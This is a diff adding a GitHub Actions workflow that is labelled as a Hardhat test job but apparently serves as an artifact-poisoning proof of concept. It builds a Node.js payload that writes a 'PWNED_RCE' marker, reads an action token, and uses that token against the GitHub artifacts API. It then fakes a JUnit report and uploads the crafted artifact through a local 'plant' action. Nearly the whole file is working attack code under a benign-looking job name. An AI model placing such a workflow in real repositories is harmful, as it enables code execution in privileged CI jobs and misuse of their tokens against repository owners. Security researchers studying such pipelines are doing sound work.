@@ -1,0 +1,46 @@
+name: CI
+on:
+  pull_request:
+permissions:
+  contents: read
+jobs:
+  run_hardhat_tests:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Build attacker payloads
+        run: |
+          mkdir -p payload
+          cat > payload/index.js <<'JS'
+          const fs = require('fs')
+          const https = require('https')
+          try {
+            fs.writeFileSync('/home/runner/work/PWNED_RCE.txt', 'executed as ' + (process.env.GITHUB_JOB || '?') + '\n')
+          } catch (e) {
+            console.log('MARKER_WRITE_FAIL ' + e.message)
+          }
+          console.log('PWNED_RCE_IN_PRIVILEGED_JOB job=' + (process.env.GITHUB_JOB || '?'))
+          console.log('EVENT_NAME=' + (process.env.GITHUB_EVENT_NAME || '?'))
+          const tok = process.env.INPUT_TOKEN || ''
+          console.log('INPUT_TOKEN_PRESENT=' + (tok ? 'yes' : 'no'))
+          setTimeout(() => process.exit(1), 25000)
+          if (tok) {
+            const req = https.request({hostname: 'api.github.com', path: '/repos/' + process.env.GITHUB_REPOSITORY + '/actions/artifacts?per_page=1', method: 'GET', headers: {'Authorization': 'Bearer ' + tok, 'User-Agent': 'poc', 'Accept': 'application/vnd.github+json'}}, res => {
+              let b = ''
+              res.on('data', c => b += c)
+              res.on('end', () => {
+                console.log('ARTIFACT_API_STATUS=' + res.statusCode + ' total=' + (JSON.parse(b).total_count))
+                process.exit(1)
+              })
+            })
+            req.on('error', e => { console.log('TOKEN_REQ_ERR ' + e.message); process.exit(1) })
+            req.end()
+          }
+          JS
+          printf '<testsuite name="s" tests="1" failures="0"><testcase name="t" classname="c" time="0.1"/></testsuite>' > payload/junit.xml
+          printf 'MARKER_FROM_ARTIFACT\n' > payload/marker.txt
+      - name: Install artifact client
+        working-directory: .github/actions/plant
+        run: npm install @actions/artifact@2.3.2 --no-save --silent
+      - name: Upload crafted artifact
+        uses: ./.github/actions/plant
